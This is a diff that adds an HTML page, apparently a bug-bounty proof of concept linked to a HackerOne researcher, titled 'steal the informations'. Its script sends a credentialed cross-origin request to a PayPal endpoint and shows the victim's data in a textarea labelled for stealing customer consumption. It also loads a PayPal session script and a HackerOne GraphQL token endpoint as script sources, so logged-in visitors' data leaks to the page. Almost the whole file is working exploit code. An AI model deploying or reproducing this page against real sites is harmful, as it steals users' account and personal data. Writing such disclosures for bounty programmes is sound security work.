@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="referrer" content="never">
+</head>
+<title>steal the informations</title>
+<div text="steal account's information">
+steal account's information
+<textarea id="account" style="width: 200px; height: 150px;"></textarea>
+</div>
+<div text="steal customer's personal informaiton">
+steal customer's personal informaiton
+<textarea id="customer" style="width: 200px; height: 150px;"></textarea>
+</div>
+<div text="steal customer's consumption">
+steal customer's consumption
+<textarea id="consumption" style="width: 200px; height: 150px;"></textarea>
+</div>
+<script>
+
+     var xmlhttp2 = new XMLHttpRequest()
+
+	
+     xmlhttp2.onreadystatechange=function()
+	{
+		if (xmlhttp2.readyState==4 && xmlhttp2.status==200)
+		{
+			document.getElementById("consumption").innerHTML = xmlhttp2.responseText;
+			console.log("steal customer's consumption successed");
+		}
+	}
+    	
+	xmlhttp2.open("GET","https://www.paypal.com/cgi-bin/gs_web/d2Fqoy2QkPv9UJKSEMiwsw4w2.Y1SsoO59lPbSmcaiCDo00nqtGXgPrRBGyvaYNVw47h6w/secret.jpeg",true);
+	xmlhttp2.withCredentials = true;
+	xmlhttp2.send();
+</script>
+<script src="https://www.paypal.com/auth/createchallenge/f77e4df7782eb734/recaptchav3.js?_sessionID="></script>
+<script src="https://hackerone.com/current_user/graphql_token.json"></script>
+<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
+</html>
